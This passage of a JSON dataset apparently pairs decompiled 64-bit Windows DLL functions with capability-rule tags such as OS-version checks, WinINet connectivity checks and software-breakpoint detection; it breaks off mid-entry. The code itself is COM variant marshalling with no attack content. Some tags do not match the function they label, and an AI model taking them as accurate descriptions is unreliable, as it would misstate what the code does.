        "decompiled_code": "\nvoid fcn.18002e328(int64_t **arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    uint32_t *puVar3;\n    ulong *puVar4;\n    code *pcVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    ulong arg1_00;\n    int64_t iVar9;\n    ulong *puVar10;\n    ulong *arg3;\n    uint32_t **ppuVar11;\n    uint16_t in_R8W;\n    uint16_t in_R9W;\n    uint8_t *puVar12;\n    uint auStackX8 [2];\n    uint uStackX16;\n    uint16_t uStackX24;\n    ulong *in_stack_00000028;\n    uint8_t *in_stack_00000030;\n    int64_t in_stack_00000038;\n    int64_t *piVar13;\n    uchar *puVar14;\n    uint *puVar15;\n    ulong uStack264;\n    uchar uStack256;\n    uchar uStack255;\n    ushort uStack254;\n    uint uStack252;\n    ulong uStack248;\n    int64_t iStack240;\n    uint *puStack232;\n    uint32_t uStack224;\n    uint uStack220;\n    uint auStack216 [2];\n    ulong *puStack208;\n    uint32_t *puStack200;\n    uint32_t *puStack192;\n    int32_t iStack184;\n    uchar auStack168 [8];\n    int64_t iStack160;\n    int64_t iStack152;\n    int64_t iStack144;\n    uint uStack136;\n    code *pcStack120;\n    uint uStack112;\n    code *pcStack104;\n    ulong uStack96;\n    ulong uStack88;\n    ulong uStack80;\n    ulong uStack72;\n    ulong uStack64;\n    \n    uStack64 = 0xfffffffffffffffe;\n    arg3 = NULL;\n    if (*arg1 != NULL) {\n        iStack240 = 0;\n        puStack232 = NULL;\n        uStack224 = 0;\n        uStack220 = 0;\n        uStackX16 = arg2;\n        uStackX24 = in_R8W;\n        fcn.180033c90(&iStack240, 0, 0x18);\n        if (in_stack_00000030 != NULL) {\n            uStack224 = (*_sym.imp.KERNEL32.dll_lstrlenA)(in_stack_00000030);\n        }\n        auStackX8[0] = 0xfffffffd;\n        if ((in_R8W & 0xc) != 0) {\n            uStack220 = 1;\n            puStack232 = auStackX8;\n        }\n        pcStack104 = vtable.CArray_class_CVariantBoolPair__class_CVariantBoolPair_const____ptr64_.0;\n        uStack96 = 0;\n        uStack72 = 0;\n        uStack80 = 0;\n        uStack88 = 0;\n        if (uStack224 != 0) {\n            arg1_00 = SUB168(ZEXT816(0x18) * ZEXT416(uStack224), 0);\n            if (SUB168(ZEXT816(0x18) * ZEXT416(uStack224) >> 0x40, 0) != 0) {\n                arg1_00 = 0xffffffffffffffff;\n            }\n            iVar9 = fcn.180009660(arg1_00);\n            iStack240 = iVar9;\n            fcn.180033c90(iVar9, 0, uStack224 * 0x18);\n            puVar10 = iVar9 + (uStack224 - 1) * 0x18;\n            if (*in_stack_00000030 != 0) {\n                ppuVar11 = in_stack_00000038 + -8;\n                puVar12 = in_stack_00000030;\n                do {\n                    uVar1 = *puVar12;\n                    *puVar10 = uVar1;\n                    if ((uVar1 & 0x40) != 0) {\n                        *puVar10 = uVar1 & 0xffbf | 0x4000;\n                    }\n                    uVar2 = *puVar10;\n                    if (uVar2 < 0x4003) {\n                        if (uVar2 == 0x4002) {\n                            ppuVar11 = ppuVar11 + 1;\n                            puVar10[1] = *ppuVar11;\n                        }\n                        else if (uVar2 < 0xc) {\n                            if (uVar2 == 0xb) {\n                                ppuVar11 = ppuVar11 + 1;\n                                *(puVar10 + 1) = -(*ppuVar11 != 0);\n                            }\n                            else if (uVar2 == 2) {\n                                ppuVar11 = ppuVar11 + 1;\n                                *(puVar10 + 1) = *ppuVar11;\n                            }\n                            else if (uVar2 == 3) {\n                                ppuVar11 = ppuVar11 + 1;\n                                *(puVar10 + 1) = *ppuVar11;\n                            }\n                            else if (uVar2 == 4) {\n                                ppuVar11 = ppuVar11 + 1;\n                                *(puVar10 + 1) = *ppuVar11;\n                            }\n                            else if (uVar2 == 5) {\n                                ppuVar11 = ppuVar11 + 1;\n                                puVar10[1] = *ppuVar11;\n                            }\n                            else if (uVar2 == 6) {\n                                ppuVar11 = ppuVar11 + 1;\n                                puVar10[1] = **ppuVar11;\n                            }\n                            else if (uVar2 == 7) {\n                                ppuVar11 = ppuVar11 + 1;\n                                puVar10[1] = *ppuVar11;\n                            }\n                            else if (uVar2 == 8) {\n                                ppuVar11 = ppuVar11 + 1;\n                                puVar3 = *ppuVar11;\n                                iVar9 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)();\n                                puVar10[1] = iVar9;\n                                if ((puVar3 != NULL) && (iVar9 == 0)) {\n                                    fcn.1800124cc();\n                                    pcVar5 = swi(3);\n                                    (*pcVar5)();\n                                    return;\n                                }\n                            }\n                            else if (uVar2 == 9) {\n                                ppuVar11 = ppuVar11 + 1;\n                                puVar10[1] = *ppuVar11;\n                            }\n                            else if (uVar2 == 10) {\n                                ppuVar11 = ppuVar11 + 1;\n                                *(puVar10 + 1) = *ppuVar11;\n                            }\n                        }\n                        else if (uVar2 == 0xc) {\n                            ppuVar11 = ppuVar11 + 1;\n                            puVar4 = *ppuVar11;\n                            *puVar10 = *puVar4;\n                            puVar10[1] = puVar4[1];\n                            puVar10[2] = puVar4[2];\n                        }\n                        else if (uVar2 == 0xd) {\n                            ppuVar11 = ppuVar11 + 1;\n                            puVar10[1] = *ppuVar11;\n                        }\n                        else if (uVar2 == 0x10) {\n                            ppuVar11 = ppuVar11 + 1;\n                            *(puVar10 + 1) = *ppuVar11;\n                        }\n                        else if (uVar2 == 0x11) {\n                            ppuVar11 = ppuVar11 + 1;\n                            *(puVar10 + 1) = *ppuVar11;\n                        }\n                        else if (uVar2 == 0x12) {\n                            ppuVar11 = ppuVar11 + 1;\n                            *(puVar10 + 1) = *ppuVar11;\n                        }\n                        else if (uVar2 == 0x13) {\n                            ppuVar11 = ppuVar11 + 1;\n                            *(puVar10 + 1) = *ppuVar11;\n                        }\n                        else if (uVar2 == 0x14) {\n                            ppuVar11 = ppuVar11 + 1;\n                            puVar10[1] = *ppuVar11;\n                        }\n                        else if (uVar2 == 0x15) {\n                            ppuVar11 = ppuVar11 + 1;\n                            puVar10[1] = *ppuVar11;\n                        }\n                    }\n                    else if (uVar2 < 0x400c) {\n                        if (uVar2 == 0x400b) {\n                            ppuVar11 = ppuVar11 + 1;\n                            puStack200 = *ppuVar11;\n                            *puStack200 = -(*puStack200 != 0) & 0xffff;\n                            puVar10[1] = puStack200;\n                            iStack184 = 0;\n                            puStack192 = puStack200;\n                            fcn.18002e23c(&pcStack104, uStack88, &puStack200);\n                            if (iStack184 != 0) {\n                                fcn.1800096a4(puStack200);\n                            }\n                        }\n                        else if (uVar2 == 0x4003) {\n                            ppuVar11 = ppuVar11 + 1;\n                            puVar10[1] = *ppuVar11;\n                        }\n                        else if (uVar2 == 0x4004) {\n                            ppuVar11 = ppuVar11 + 1;\n                            puVar10[1] = *ppuVar11;\n                        }\n                        else if (uVar2 == 0x4005) {\n                            ppuVar11 = ppuVar11 + 1;\n                            puVar10[1] = *ppuVar11;\n                        }\n                        else if (uVar2 == 0x4006) {\n                            ppuVar11 = ppuVar11 + 1;\n                            puVar10[1] = *ppuVar11;\n                        }\n                        else if (uVar2 == 0x4007) {\n                            ppuVar11 = ppuVar11 + 1;\n                            puVar10[1] = *ppuVar11;\n                        }\n                        else if (uVar2 == 0x4008) {\n                            ppuVar11 = ppuVar11 + 1;\n                            puVar10[1] = *ppuVar11;\n                        }\n                        else if (uVar2 == 0x4009) {\n                            ppuVar11 = ppuVar11 + 1;\n                            puVar10[1] = *ppuVar11;\n                        }\n                        else if (uVar2 == 0x400a) {\n                            ppuVar11 = ppuVar11 + 1;\n                            puVar10[1] = *ppuVar11;\n                        }\n                    }\n                    else if (uVar2 == 0x400c) {\n                        ppuVar11 = ppuVar11 + 1;\n                        puVar10[1] = *ppuVar11;\n                    }\n                    else if (uVar2 == 0x400d) {\n                        ppuVar11 = ppuVar11 + 1;\n                        puVar10[1] = *ppuVar11;\n                    }\n                    else if (uVar2 == 0x4010) {\n                        ppuVar11 = ppuVar11 + 1;\n                        puVar10[1] = *ppuVar11;\n                    }\n                    else if (uVar2 == 0x4011) {\n                        ppuVar11 = ppuVar11 + 1;\n                        puVar10[1] = *ppuVar11;\n                    }\n                    else if (uVar2 == 0x4012) {\n                        ppuVar11 = ppuVar11 + 1;\n                        puVar10[1] = *ppuVar11;\n                    }\n                    else if (uVar2 == 0x4013) {\n                        ppuVar11 = ppuVar11 + 1;\n                        puVar10[1] = *ppuVar11;\n                    }\n                    else if (uVar2 == 0x4014) {\n                        ppuVar11 = ppuVar11 + 1;\n                        puVar10[1] = *ppuVar11;\n                    }\n                    else if (uVar2 == 0x4015) {\n                        ppuVar11 = ppuVar11 + 1;\n                        puVar10[1] = *ppuVar11;\n                    }\n                    puVar10 = puVar10 + -3;\n                    puVar12 = puVar12 + 1;\n                } while (*puVar12 != 0);\n            }\n        }\n        fcn.18001d3b4(&uStack264);\n        puVar10 = &uStack264;\n        if (in_R9W == 0) {\n            puVar10 = arg3;\n        }\n        fcn.180033c90(auStack168, 0, 0x40);\n        auStack216[0] = 0xffffffff;\n        puVar15 = auStack216;\n        puVar14 = auStack168;\n        piVar13 = &iStack240;\n        uVar6 = (**(**arg1 + 0x30))();\n        fcn.18002e2b8(&pcStack104);\n        if (uStack224 != 0) {\n            iVar9 = iStack240 + -0x18 + uStack224 * 0x18;\n            uVar1 = *in_stack_00000030;\n            while (uVar1 != 0) {\n                if (*in_stack_00000030 == 8) {\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(iVar9);\n                }\n                iVar9 = iVar9 + -0x18;\n                in_stack_00000030 = in_stack_00000030 + 1;\n                uVar1 = *in_stack_00000030;\n            }\n        }\n        fcn.1800096a4(iStack240);\n        iStack240 = 0;\n        if (uVar6 < 0) {\n            (*_sym.imp.OLEAUT32.dll_VariantCopy)();\n            if (uVar6 != 0x80020009) {\n                fcn.180014130(uVar6);\n                pcVar5 = swi(3);\n                (*pcVar5)();\n                return;\n            }\n            if (pcStack120 != NULL) {\n                (*pcStack120)(auStack168);\n            }\n            puStack208 = fcn.180009660(0x40);\n            puVar10 = arg3;\n            if (puStack208 != NULL) {\n                puVar10 = fcn.1800308dc(puStack208, 0, 0);\n            }\n            iVar7 = (*_sym.imp.OLEAUT32.dll_VariantInit)(iStack160);\n            iVar9 = iStack160;\n            uVar6 = 0;\n            if (iVar7 != 0) {\n                uVar8 = uVar6;\n                if (iStack160 != 0) {\n                    uVar8 = fcn.180033b84(iStack160);\n                }\n                fcn.180008dfc(puVar10 + 6, iVar9, uVar8);\n            }\n            (*_sym.imp.OLEAUT32.dll_SysStringLen)(iStack160);\n            iVar7 = (*_sym.imp.OLEAUT32.dll_VariantInit)(iStack152);\n            iVar9 = iStack152;\n            if (iVar7 != 0) {\n                if (iStack152 != 0) {\n                    uVar6 = fcn.180033b84(iStack152);\n                }\n                fcn.180008dfc(puVar10 + 3, iVar9, uVar6);\n            }\n            (*_sym.imp.OLEAUT32.dll_SysStringLen)(iStack152);\n            iVar7 = (*_sym.imp.OLEAUT32.dll_VariantInit)(iStack144);\n            iVar9 = iStack144;\n            if (iVar7 != 0) {\n                if (iStack144 != 0) {\n                    uVar6 = fcn.180033b84(iStack144);\n                    arg3 = uVar6;\n                }\n                fcn.180008dfc(puVar10 + 5, iVar9, arg3);\n            }\n            (*_sym.imp.OLEAUT32.dll_SysStringLen)(iStack144);\n            *(puVar10 + 4) = uStack136;\n            *(puVar10 + 7) = uStack112;\n            puStack208 = puVar10;\n            fcn.180036174(&puStack208, 0x180062be0);\n            pcVar5 = swi(3);\n            (*pcVar5)();\n            return;\n        }\n        if (in_R9W != 0) {\n            if (in_R9W != 0xc) {\n                uVar6 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)\n                                  (&uStack264, &uStack264, 0, in_R9W, uStackX24, piVar13, puVar10, puVar14, puVar15);\n                if (uVar6 < 0) {\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)();\n                    fcn.180014130(uVar6);\n                    pcVar5 = swi(3);\n                    (*pcVar5)();\n                    return;\n                }\n            }\n            if (in_R9W < 0xc) {\n                if (in_R9W == 0xb) {\n                    *in_stack_00000028 = CONCAT11(uStack255, uStack256) != 0;\n                }\n                else if (in_R9W == 2) {\n                    *in_stack_00000028 = CONCAT11(uStack255, uStack256);\n                }\n                else if (in_R9W == 3) {\n                    *in_stack_00000028 = CONCAT22(uStack254, CONCAT11(uStack255, uStack256));\n                }\n                else if (in_R9W == 4) {\n                    *in_stack_00000028 = CONCAT22(uStack254, CONCAT11(uStack255, uStack256));\n                }\n                else if (in_R9W == 5) {\n                    *in_stack_00000028 = CONCAT44(uStack252, CONCAT22(uStack254, CONCAT11(uStack255, uStack256)));\n                }\n                else if (in_R9W == 6) {\n                    *in_stack_00000028 = CONCAT44(uStack252, CONCAT22(uStack254, CONCAT11(uStack255, uStack256)));\n                }\n                else if (in_R9W == 7) {\n                    *in_stack_00000028 = CONCAT44(uStack252, CONCAT22(uStack254, CONCAT11(uStack255, uStack256)));\n                }\n                else if (in_R9W == 8) {\n                    fcn.180031fe4(in_stack_00000028, \n                                  CONCAT44(uStack252, CONCAT22(uStack254, CONCAT11(uStack255, uStack256))));\n                    (*_sym.imp.OLEAUT32.dll_SysStringLen)\n                              (CONCAT44(uStack252, CONCAT22(uStack254, CONCAT11(uStack255, uStack256))));\n                }\n                else if (in_R9W == 9) {\n                    *in_stack_00000028 = CONCAT44(uStack252, CONCAT22(uStack254, CONCAT11(uStack255, uStack256)));\n                }\n                else if (in_R9W == 10) {\n                    *in_stack_00000028 = CONCAT22(uStack254, CONCAT11(uStack255, uStack256));\n                }\n            }\n            else if (in_R9W == 0xc) {\n                *in_stack_00000028 = uStack264;\n                in_stack_00000028[1] = CONCAT44(uStack252, CONCAT22(uStack254, CONCAT11(uStack255, uStack256)));\n                in_stack_00000028[2] = uStack248;\n            }\n            else if (in_R9W == 0xd) {\n                *in_stack_00000028 = CONCAT44(uStack252, CONCAT22(uStack254, CONCAT11(uStack255, uStack256)));\n            }\n            else if (in_R9W == 0x10) {\n                *in_stack_00000028 = uStack256;\n            }\n            else if (in_R9W == 0x11) {\n                *in_stack_00000028 = uStack256;\n            }\n            else if (in_R9W == 0x12) {\n                *in_stack_00000028 = CONCAT11(uStack255, uStack256);\n            }\n            else if (in_R9W == 0x13) {\n                *in_stack_00000028 = CONCAT22(uStack254, CONCAT11(uStack255, uStack256));\n            }\n            else if (in_R9W == 0x14) {\n                *in_stack_00000028 = CONCAT44(uStack252, CONCAT22(uStack254, CONCAT11(uStack255, uStack256)));\n            }\n            else if (in_R9W == 0x15) {\n                *in_stack_00000028 = CONCAT44(uStack252, CONCAT22(uStack254, CONCAT11(uStack255, uStack256)));\n            }\n        }\n        fcn.18002e148(&pcStack104);\n        if (iStack240 != 0) {\n            fcn.1800096a4(iStack240);\n        }\n    }\n    return;\n}\n",
        "token_count": 4757
    },
    "18002ee2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.18002ee28(ulong arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    \n    fcn.180032238();\n    fcn.180032170();\n    fcn.1800320ec();\n    if (arg1 == 0) {\n        iVar2 = fcn.180010ad4();\n        if (iVar2 != 0) {\n            piVar1 = *(iVar2 + 0x80);\n            if (piVar1 != NULL) {\n                (**(*piVar1 + 8))(piVar1, 1);\n            }\n            *(iVar2 + 0x80) = 0;\n        }\n        iVar2 = fcn.180013824();\n        if (*(iVar2 + 0x1dc) == 1) {\n            (*_sym.imp.ole32.dll_CoFreeUnusedLibraries)();\n            (*_sym.imp.ole32.dll_OleUninitialize)();\n            *(iVar2 + 0x1dc) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 229
    },
    "18002f41": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint fcn.18002f41c(ulong arg1)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    if (arg1 < 0x10c) {\n        if (arg1 == 0x10b) {\n            return 3;\n        }\n        if (0x3e < arg1) {\n            if (arg1 < 0x6c) {\n                if (arg1 == 0x6b) {\n                    return 2;\n                }\n                if (0x47 < arg1) {\n                    if (arg1 == 0x50) {\n                        return 5;\n                    }\n                    if (arg1 == 0x52) {\n                        return 5;\n                    }\n                    if (arg1 == 0x55) {\n                        return 3;\n                    }\n                    if (arg1 != 0x56) {\n                        if (arg1 == 0x58) {\n                            return 10;\n                        }\n                        return 1;\n                    }\n                    return 5;\n                }\n                if (arg1 == 0x47) {\n                    return 5;\n                }\n                if (arg1 == 0x40) {\n                    return 5;\n                }\n                if (arg1 == 0x41) {\n                    return 5;\n                }\n                if (arg1 == 0x42) {\n                    return 6;\n                }\n                if (arg1 == 0x43) {\n                    return 3;\n                }\n                iVar1 = arg1 - 0x44;\n                if (iVar1 == 0) {\n                    return 4;\n                }\n            }\n            else {\n                if (arg1 < 0x91) {\n                    if (arg1 == 0x90) {\n                        return 3;\n                    }\n                    if (arg1 < 0x76) {\n                        if (arg1 == 0x75) {\n                            return 10;\n                        }\n                        if (arg1 == 0x6c) {\n                            return 0xc;\n                        }\n                        if (arg1 == 0x6f) {\n                            return 3;\n                        }\n                        if (arg1 == 0x70) {\n                            return 0xd;\n                        }\n                        iVar1 = arg1 - 0x71;\n                        if (iVar1 == 0) {\n                            return 4;\n                        }\n                        goto code_r0x00018002f61b;\n                    }\n                    if (arg1 == 0x7b) {\n                        return 3;\n                    }\n                    if (arg1 == 0x7c) {\n                        return 3;\n                    }\n                    if (arg1 == 0x7d) {\n                        return 3;\n                    }\n                    iVar1 = arg1 - 0x83;\n                    if (iVar1 == 0) {\n                        return 9;\n                    }\ncode_r0x00018002f4d4:\n                    if (iVar1 == 1) {\n                        return 9;\n                    }\n                    return 1;\n                }\n                if (arg1 < 0xb7) {\n                    if (arg1 == 0xb6) {\n                        return 6;\n                    }\n                    if (arg1 == 0x91) {\n                        return 7;\n                    }\n                    if (arg1 == 0x9a) {\n                        return 3;\n                    }\n                    if (arg1 == 0xa1) {\n                        return 3;\n                    }\n                    if (arg1 == 0xa7) {\n                        return 0xc;\n                    }\n                    bVar2 = arg1 == 0xaa;\n                    goto code_r0x00018002f688;\n                }\n                if (arg1 == 0xb7) {\n                    return 5;\n                }\n                if (arg1 == 0xbf) {\n                    return 6;\n                }\n                if (arg1 == 0xc1) {\n                    return 6;\n                }\n                iVar1 = arg1 - 0xce;\n                if (iVar1 == 0) {\n                    return 3;\n                }\n            }\n            bVar2 = iVar1 == 2;\ncode_r0x00018002f47a:\n            if (bVar2) {\n                return 3;\n            }\n            return 1;\n        }\n        if (arg1 == 0x3e) {\n            return 8;\n        }\n        if (arg1 < 0x1a) {\n            if (arg1 == 0x19) {\n                return 9;\n            }\n            if (arg1 < 0x11) {\n                if (arg1 == 0x10) {\n                    return 7;\n                }\n                if (arg1 == 0) {\n                    return 0;\n                }\n                if (arg1 == 2) {\n                    return 2;\n                }\n                if (arg1 == 3) {\n                    return 3;\n                }\n                if (arg1 == 4) {\n                    return 4;\n                }\n                if (arg1 == 5) {\n                    return 5;\n                }\n                if (arg1 == 6) {\n                    return 2;\n                }\n                if (arg1 == 0xb) {\n                    return 6;\n                }\n                if (arg1 == 0xc) {\n                    return 5;\n                }\n                bVar2 = arg1 == 0xf;\n                goto code_r0x00018002f47a;\n            }\n            if (arg1 == 0x11) {\n                return 3;\n            }\n            if (arg1 == 0x12) {\n                return 2;\n            }\n            if (arg1 == 0x13) {\n                return 5;\n            }\n            if (((arg1 != 0x14) && (arg1 != 0x15)) && ((arg1 != 0x16 && (iVar1 = arg1 - 0x17,  iVar1 != 0))))\n            goto code_r0x00018002f4d4;\n        }\n        else {\n            if (arg1 < 0x28) {\n                if (arg1 == 0x27) {\n                    return 0xd;\n                }\n                if (arg1 == 0x1a) {\n                    return 6;\n                }\n                if (arg1 == 0x1b) {\n                    return 9;\n                }\n                if (arg1 == 0x1d) {\n                    return 5;\n                }\n                if (arg1 == 0x1e) {\n                    return 9;\n                }\n                if (arg1 == 0x20) {\n                    return 0xb;\n                }\n                if (arg1 == 0x21) {\n                    return 0xc;\n                }\n                if (arg1 != 0x22) {\n                    if (arg1 == 0x24) {\n                        return 4;\n                    }\n                    if (arg1 == 0x26) {\n                        return 0xe;\n                    }\n                    return 1;\n                }\n                return 3;\n            }\n            if (arg1 == 0x34) {\n                return 3;\n            }\n            if (arg1 == 0x35) {\n                return 3;\n            }\n            if (arg1 == 0x36) {\n                return 5;\n            }\n            if (arg1 == 0x37) {\n                return 3;\n            }\n            if (arg1 != 0x39) {\n                if (arg1 == 0x3a) {\n                    return 5;\n                }\n                iVar1 = arg1 - 0x3b;\n                if (iVar1 != 0) {\ncode_r0x00018002f61b:\n                    if (iVar1 == 1) {\n                        return 6;\n                    }\n                    return 1;\n                }\n            }\n        }\n    }\n    else if (((arg1 != 0x3e3) && (arg1 != 0x3e4)) && (arg1 != 0x3e5)) {\n        bVar2 = arg1 == 999;\ncode_r0x00018002f688:\n        if (bVar2) {\n            return 5;\n        }\n        return 1;\n    }\n    return 10;\n}\n",
        "token_count": 1758
    },
    "18002ff6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint64_t fcn.18002ff68(ulong arg1, ulong *arg2, uint8_t *arg3, uint32_t *arg4)\n\n{\n    uint8_t uVar1;\n    int16_t iVar2;\n    int64_t iVar3;\n    code *pcVar4;\n    bool bVar5;\n    uint32_t uVar6;\n    uint32_t *puVar7;\n    uint32_t **ppuVar8;\n    uint16_t uVar9;\n    uint32_t *puVar10;\n    uint64_t uVar11;\n    int32_t iVar12;\n    int16_t in_stack_00000028;\n    int32_t iStack0000000000000028;\n    int64_t *in_stack_00000030;\n    int32_t *in_stack_00000038;\n    int64_t in_stack_00000040;\n    int64_t in_stack_00000048;\n    ulong uVar13;\n    uint32_t *puStack64;\n    int64_t iStack56;\n    int32_t iStack48;\n    \n    uVar13 = 0xfffffffffffffffe;\n    *arg2 = arg1;\n    ppuVar8 = arg2 + 1;\n    if ((in_stack_00000028 == 6) || (in_stack_00000028 == 0xc)) {\n        *ppuVar8 = arg4;\n        ppuVar8 = arg2 + 2;\n    }\n    iVar3 = *in_stack_00000030;\n    bVar5 = false;\n    iVar12 = *(in_stack_00000030 + 2);\n    iStack0000000000000028 = *(in_stack_00000030 + 0x14);\n    uVar1 = *arg3;\n    do {\n        if (uVar1 == 0) {\ncode_r0x000180030333:\n            if (iVar12 < 1) {\n                if (*arg3 == 0) {\n                    uVar11 = 0;\n                }\n                else {\n                    *in_stack_00000038 = *(in_stack_00000030 + 2);\n                    uVar11 = 0x8002000f;\n                }\n            }\n            else {\n                uVar11 = 0x8002000e;\ncode_r0x00018003033e:\n                *in_stack_00000038 = iVar12;\n            }\n            return uVar11;\n        }\n        iVar12 = iVar12 + -1;\n        uVar1 = *arg3;\n        uVar9 = uVar1;\n        if ((uVar1 != 0xff) && (uVar9 = uVar1,  (uVar1 & 0x40) != 0)) {\n            uVar9 = uVar1 & 0xffbf | 0x4000;\n        }\n        if (iVar12 < iStack0000000000000028) {\n            if (uVar9 != 0xff) {\n                if ((!bVar5) && (uVar9 == 0xc)) {\n                    *0x18006d378 = 10;\n                    *0x18006d380 = 0x80020004;\n                    puVar10 = 0x18006d378;\n                    goto code_r0x0001800300d0;\n                }\n                goto code_r0x000180030333;\n            }\n            iVar12 = *(in_stack_00000030 + 0x14);\n            iStack0000000000000028 = 0;\n            bVar5 = true;\n        }\n        else {\n            if (uVar9 == 0xff) goto code_r0x000180030333;\n            puVar7 = iVar3 + iVar12 * 0x18;\n            puVar10 = puVar7;\n            if ((uVar9 != 0xc) && (uVar9 != *puVar7)) {\n                puVar10 = in_stack_00000040 + iVar12 * 0x18;\n                uVar6 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(puVar10, puVar7, 0, uVar9, uVar13);\n                uVar11 = uVar6;\n                if (uVar6 < 0) goto code_r0x00018003033e;\n            }\ncode_r0x0001800300d0:\n            if ((uVar9 & 0x4000) == 0) {\n                if (uVar9 < 0xc) {\n                    if (uVar9 == 0xb) {\n                        *ppuVar8 = *(puVar10 + 2) != 0;\n                        ppuVar8 = ppuVar8 + 1;\n                    }\n                    else if (uVar9 == 2) {\n                        *ppuVar8 = *(puVar10 + 2);\n                        ppuVar8 = ppuVar8 + 1;\n                    }\n                    else if (uVar9 == 3) {\n                        *ppuVar8 = puVar10[2];\n                        ppuVar8 = ppuVar8 + 1;\n                    }\n                    else if (uVar9 == 4) {\n                        *ppuVar8 = puVar10[2];\n                        ppuVar8 = ppuVar8 + 4;\n                    }\n                    else if (uVar9 == 5) {\n                        *ppuVar8 = *(puVar10 + 2);\n                        ppuVar8 = ppuVar8 + 1;\n                    }\n                    else if (uVar9 == 6) {\n                        *ppuVar8 = *(puVar10 + 2);\n                        ppuVar8 = ppuVar8 + 1;\n                    }\n                    else if (uVar9 == 7) {\n                        *ppuVar8 = *(puVar10 + 2);\n                        ppuVar8 = ppuVar8 + 1;\n                    }\n                    else if (uVar9 == 8) {\n                        *ppuVar8 = *(puVar10 + 2);\n                        ppuVar8 = ppuVar8 + 1;\n                    }\n                    else {\n                        if (uVar9 == 9) goto code_r0x0001800302e9;\n                        if (uVar9 == 10) {\n                            *ppuVar8 = puVar10[2];\n                            ppuVar8 = ppuVar8 + 1;\n                        }\n                    }\n                }\n                else if (uVar9 == 0xc) {\n                    *ppuVar8 = puVar10;\n                    ppuVar8 = ppuVar8 + 1;\n                }\n                else if (uVar9 == 0xd) {\ncode_r0x0001800302e9:\n                    *ppuVar8 = *(puVar10 + 2);\n                    ppuVar8 = ppuVar8 + 1;\n                }\n                else if (uVar9 == 0x10) {\n                    *ppuVar8 = *(puVar10 + 2);\n                    ppuVar8 = ppuVar8 + 1;\n                }\n                else if (uVar9 == 0x11) {\n                    *ppuVar8 = *(puVar10 + 2);\n                    ppuVar8 = ppuVar8 + 1;\n                }\n                else if (uVar9 == 0x12) {\n                    *ppuVar8 = *(puVar10 + 2);\n                    ppuVar8 = ppuVar8 + 1;\n                }\n                else if (uVar9 == 0x13) {\n                    *ppuVar8 = puVar10[2];\n                    ppuVar8 = ppuVar8 + 1;\n                }\n                else if (uVar9 == 0x14) {\n                    *ppuVar8 = *(puVar10 + 2);\n                    ppuVar8 = ppuVar8 + 1;\n                }\n                else if (uVar9 == 0x15) {\n                    *ppuVar8 = *(puVar10 + 2);\n                    ppuVar8 = ppuVar8 + 1;\n                }\n            }\n            else {\n                if ((uVar9 == 0x400b) && (in_stack_00000048 != 0)) {\n                    iVar2 = **(puVar10 + 2);\n                    puVar7 = fcn.180009660(4);\n                    if (puVar7 == NULL) {\n                        puVar7 = NULL;\n                    }\n                    else {\n                        *puVar7 = iVar2 != 0;\n                    }\n                    iStack56 = *(puVar10 + 2);\n                    iStack48 = 1;\n                    puStack64 = puVar7;\n                    if ((puVar7 == NULL) || (iStack56 == 0)) {\n                        fcn.180012514();\n                        pcVar4 = swi(3);\n                        uVar11 = (*pcVar4)();\n                        return uVar11;\n                    }\n                    fcn.18002e23c(in_stack_00000048, *(in_stack_00000048 + 0x10), &puStack64);\n                    if (iStack48 != 0) {\n                        fcn.1800096a4(puStack64);\n                    }\n                }\n                else {\n                    puVar7 = *(puVar10 + 2);\n                }\n                *ppuVar8 = puVar7;\n                ppuVar8 = ppuVar8 + 1;\n            }\n            ppuVar8 = ppuVar8 + 7U & 0xfffffffffffffff8;\n        }\n        arg3 = arg3 + 1;\n        uVar1 = *arg3;\n    } while( true );\n}\n",
        "token_count": 2079
    },
    "18003038": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.18003038c(int64_t arg1, int64_t arg2, ulong noname_2, ulong *arg4, int64_t noname_4, ulong noname_5, \n                  ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n                  ulong noname_12, ulong noname_13, ulong noname_14, ulong noname_15, ulong noname_16, ulong noname_17, \n                  ulong noname_18, ulong noname_19, ulong noname_20, ulong noname_21, ulong noname_22, ulong noname_23, \n                  ulong noname_24, ulong noname_25, ulong arg_e0h, ulong arg_e8h)\n\n{\n    ushort uVar1;\n    code *pcVar2;\n    uchar *puVar3;\n    int64_t arg1_00;\n    char cVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    int64_t *piVar8;\n    uint64_t arg1_01;\n    int64_t *piVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    int64_t *piVar12;\n    int64_t iVar13;\n    uint16_t uVar14;\n    ulong arg1_02;\n    uint uVar15;\n    ulong var_8h;\n    ulong var_10h;\n    ulong var_18h;\n    ulong var_20h;\n    ulong pvargDest;\n    ulong var_40h;\n    ulong var_48h;\n    ulong var_bp_50h;\n    ulong var_58h;\n    ulong var_60h;\n    ulong var_68h;\n    ulong var_70h;\n    ulong var_78h;\n    ulong var_88h;\n    ulong 